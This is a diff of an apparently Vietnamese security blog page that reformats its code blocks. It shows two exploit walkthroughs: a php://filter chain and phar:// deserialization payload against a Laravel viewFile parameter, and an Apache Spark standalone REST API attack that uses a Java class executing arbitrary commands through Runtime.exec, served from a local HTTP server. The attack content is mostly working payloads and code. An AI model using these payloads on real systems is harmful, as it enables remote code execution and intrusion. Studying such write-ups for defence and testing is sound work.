+<pre tabindex="0"><code>&#34;viewFile&#34;:
+&#34;php://filter/write=convert.quoted-printable-decode
+						/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
 <ul>
 <li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.iconv.utf-16le.utf-8
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						/resource=../storage/logs/laravel.log&#34;</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:
+&#34;php://filter/write=convert.iconv.utf-16le.utf-8
+						/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
 <ul>
 <li><code>convert.base64-decode</code>: xóa các ký tự khi convert từ <code>UTF-16</code> sang <code>UTF-8</code> mà nằm ngoài bảng mã và convert file log sang PHAR file.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.base64-decode
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						/resource=../storage/logs/laravel.log&#34;</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:
+&#34;php://filter/write=convert.base64-decode
+						/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
 </li>
 </ul>
 <ol start="5">
 <li>Chạy PHAR deserialization</li>
 </ol>
 <p>Payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;phar:///var/www/storage/logs/laravel.log&#34;</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;phar:///var/www/storage/logs/laravel.log&#34;
+</code></pre><p></p>
 <ul>
 <li>
 <p>Script exploit tự động</p>
@@ -976,42 +976,42 @@ Lỗ hổng xảy ra ở chế độ <code>standalone</code> khi xác thực quy
 <p>Đây là giao diện chính của Spark Worker:</p>
 <p></p>
 <p><strong>Bước 2:</strong> Tạo một file exploit viết bằng java và lưu với tên <code>Exploit.java</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.BufferedReader;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStreamReader;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> {
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> cmds <span style="color:#f92672">=</span> args<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;,&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String cmd : cmds) {
-</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(cmd);
-</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(executeCommand(cmd.<span style="color:#a6e22e">trim</span>()));
-</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;==============================================&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">executeCommand</span>(String command) {
-</span></span><span style="display:flex;"><span>    StringBuilder output <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>      Process p <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(command);
-</span></span><span style="display:flex;"><span>      p.<span style="color:#a6e22e">waitFor</span>();
-</span></span><span style="display:flex;"><span>      BufferedReader reader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader(<span style="color:#66d9ef">new</span> InputStreamReader(p.<span style="color:#a6e22e">getInputStream</span>()));       
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>      String line;
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ((line <span style="color:#f92672">=</span> reader.<span style="color:#a6e22e">readLine</span>()) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>        output.<span style="color:#a6e22e">append</span>(line).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
-</span></span><span style="display:flex;"><span>      }
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
-</span></span><span style="display:flex;"><span>      e.<span style="color:#a6e22e">printStackTrace</span>();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output.<span style="color:#a6e22e">toString</span>();
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><strong>Bước 3:</strong> Convert tệp <code>Exploit.java</code> thành <code>Exploit.jar</code> bằng 2 câu lệnh:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>javac .<span style="color:#960050;background-color:#1e0010">\</span>Exploit.<span style="color:#a6e22e">jar</span>
-</span></span><span style="display:flex;"><span>jar <span style="color:#f92672">-</span>cvf Exploit.<span style="color:#a6e22e">jar</span> Exploit.<span style="color:#a6e22e">java</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class Exploit {
+  public static void main(String[] args) throws Exception {
+    String[] cmds = args[0].split(&#34;,&#34;);
+
+    for (String cmd : cmds) {
+      System.out.println(cmd);
+      System.out.println(executeCommand(cmd.trim()));
+      System.out.println(&#34;==============================================&#34;);
+    }
+  }
+  private static String executeCommand(String command) {
+    StringBuilder output = new StringBuilder();
+
+    try {
+      Process p = Runtime.getRuntime().exec(command);
+      p.waitFor();
+      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));       
+
+      String line;
+      while ((line = reader.readLine()) != null) {
+        output.append(line).append(&#34;\n&#34;);
+      }
+    } catch (Exception e) {
+      e.printStackTrace();
+    }
+
+    return output.toString();
+  }
+}
+</code></pre><p><strong>Bước 3:</strong> Convert tệp <code>Exploit.java</code> thành <code>Exploit.jar</code> bằng 2 câu lệnh:</p>
+<pre tabindex="0"><code>javac .\Exploit.jar
+jar -cvf Exploit.jar Exploit.java
+</code></pre><p></p>
 <p><strong>Bước 4:</strong> Khởi tạo máy chủ local để đẩy file <code>Exploit.jar</code> lên server với câu lệnh <code>python -m http.server</code></p>
 <p></p>
 <p><strong>Bước 5:</strong> Ở chế độ <code>standalone</code>, máy chủ sẽ khởi động máy chủ HTTP trên cổng 6066 và chúng ta sẽ gửi API REST tới cổng này:</p>
